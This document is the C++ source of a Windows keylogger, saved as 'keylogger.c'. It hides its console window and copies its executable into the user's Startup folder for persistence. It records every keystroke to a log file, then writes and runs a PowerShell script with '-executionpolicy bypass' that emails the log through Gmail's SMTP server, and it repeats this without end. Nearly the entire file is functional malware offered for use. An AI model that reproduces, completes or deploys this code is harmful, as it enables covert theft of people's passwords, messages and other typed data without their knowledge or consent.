/* save it as keylogger.c  */
#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0500 
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <Winuser.h>
#include <stdlib.h>
#include <time.h>
#include <direct.h>



using namespace std;


int Save(int key, char *file);
int main()
{
jump:

	HWND hWnd = GetConsoleWindow(); //makes windows invisible
	ShowWindow(hWnd, SW_HIDE);

	char startup[128];
	char address_bat[128];
	char address_log[128];
	char address_email[128];
	char batfile[128] = "\\Downloads\\file.bat\0";
	char logfile[128] = "\\Downloads\\LOG.txt\0";
	char emailfile[128] = "\\Downloads\\email.ps1\0";
	char i;
	
	char* buffer;

	// Get the current working directory: 
	if ((buffer = _getcwd(NULL, 0)) == NULL)
		perror("_getcwd error");
  //else
	  //printf("%s \nLength: %d\n", buffer, strlen(buffer));
		
	
	int x = 0;
	int backslash = 0;

	for (x = 0;; x++) //this loop makes starup = "C:\...\...\"
	{
		startup[x] = buffer[x];
		address_bat[x] = startup[x];
		address_log[x] = startup[x];
		address_email[x] = startup[x];

		if (buffer[x] == 92)
		{
			backslash++;
			if (backslash == 3)
			{
				startup[x++]='\0';
				address_bat[x++] = '\0';
				address_log[x++] = '\0';
				address_email[x++] = '\0';
				break;
			}
		}
	}
	//printf("\n%s\n", startup);

	strcat(address_bat, batfile);
	strcat(address_log, logfile);
	strcat(address_email, emailfile);
	
	FILE *ptr1, *ptr2;

	//////////////////////////////////////////////
	//moving the bat file to bootable folder
	ptr1 = fopen(address_bat, "w");
	
	fprintf(ptr1, "copy \"%s\\Desktop\\LogProject.exe\" \"%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", startup ,startup);
	fclose(ptr1);

	system(address_bat);

	////////////////////////////////////////////////
	//saving userinput to file
	clock_t start, end; //clocks to keep track of time
	double elapsed;

	start = clock();
	double test_time = 20; //test_time 60 seconds
	
	for (;;) //this loop will save userinput into LOG.txt unless elapsed time > test_time (more then 60 seconds have passed)
	{
		for (i = 8; i <= 190; i++)
		{
			
			if (GetAsyncKeyState(i) == -32767)
			{
				
				Save(i, address_log);
				break;
			}

			
		}
		
		end = clock();
		elapsed = ((double)(end - start)) / (double)CLOCKS_PER_SEC;
		
		if (elapsed > test_time)
		{
			break;
		}
	}
	
	//////////////////////////////////////////////////////////////////
	//this part of the program does not start unless 60 seconds have passed
	//create a powershell file and run in in cmd (it will send the email ever 60 seconds)

	ptr2 = fopen(address_email, "w");
	fprintf(ptr2, "\
			$emailFrom = \"EMAIL.gmail.com\"\n\
			$emailTo = \"EMAIL.gmail.com\"\n\
			$subject = \"Powershell Function calling an SMTP server with attachment\"\n\
			$body = \"Send an email through SMTP in Powershell with attachment\"\n\
			$smtpServer = \"smtp.gmail.com\"\n\
			$filePath = \"%s\"\n\
			$smtp = New-Object Net.Mail.SmtpClient($smtpServer, 587)\n\
			$smtp.EnableSsl = $true\n\
			$smtp.Credentials = New-Object System.Net.NetworkCredential(\"email(nogmail.com)\", \"PASSWORD\");\n\
			\
			Function sendEmail([string]$emailFrom, [string]$emailTo, [string]$subject, [string]$body, [string]$smtpServer, [string]$filePath)\n\
				{\n\
					#initate message\n\
						$email = New-Object System.Net.Mail.MailMessage\n\
						$email.From = $emailFrom\n\
						$email.To.Add($emailTo)\n\
						$email.Subject = $subject\n\
						$email.Body = $body\n\
					#initiate email attachment\n\
						$emailAttach = New-Object System.Net.Mail.Attachment $filePath\n\
						$email.Attachments.Add($emailAttach)\n\
					#initiate sending email\n\
						$smtp.Send($email)\n\
				}\n\
			\
			#Call Function\n\
			sendEmail $emailFrom $emailTo $subject $body $smtpServer $filePath", address_log);

	fclose(ptr2);

	/////////////////////////////////////////////
	//powershell script to email
	char p_shell[128] = "powershell -executionpolicy bypass \"& \"";
	strcat(p_shell, address_email);
	strcat(p_shell, "\"\"");
	system(p_shell); //execute the powershell file
	//system("del \"C:\\Users\\kelagar\\Desktop\\email.ps1\""); //delete it after
	
	printf("\nSENT\n");

	goto jump; //loop the entire main program  

}

int Save(int key, char *file)
{
	if ((key == 1) || (key == 2))
		return 0;

	FILE *ptr;
	ptr = fopen(file, "a+");
	
	if (key == 8)
		fprintf(ptr, "%s", "[BackSpace]");

	else if (key == 13)
		fprintf(ptr, "%s", "\n");

	else if (key == 32)
		fprintf(ptr, "%s", " ");

	else if (key == VK_TAB)
		fprintf(ptr, "%s", "[TAB]");

	else if (key == VK_SHIFT)
		fprintf(ptr, "%s", "[SHIFT]");

	else if (key == VK_CONTROL)
		fprintf(ptr, "%s", "[CONTROL]");

	else if (key == VK_ESCAPE)
		fprintf(ptr, "%s", "[ESCAPE]");

	else if (key == VK_END)
		fprintf(ptr, "%s", "[END]");

	else if (key == VK_HOME)
		fprintf(ptr, "%s", "HOME");

	else if (key == VK_LEFT)
		fprintf(ptr, "%s", "[LEFT]");

	else if (key == VK_UP)
		fprintf(ptr, "%s", "[UP]");

	else if (key == VK_RIGHT)
		fprintf(ptr, "%s", "[RIGHT]");

	else if (key == VK_DOWN)
		fprintf(ptr, "%s", "[DOWN]");

	else if (key == 190 || key == 110)
		fprintf(ptr, "%s", ".");

	else
		fprintf(ptr, "%s", &key);
	fclose(ptr);

	return 0;
}

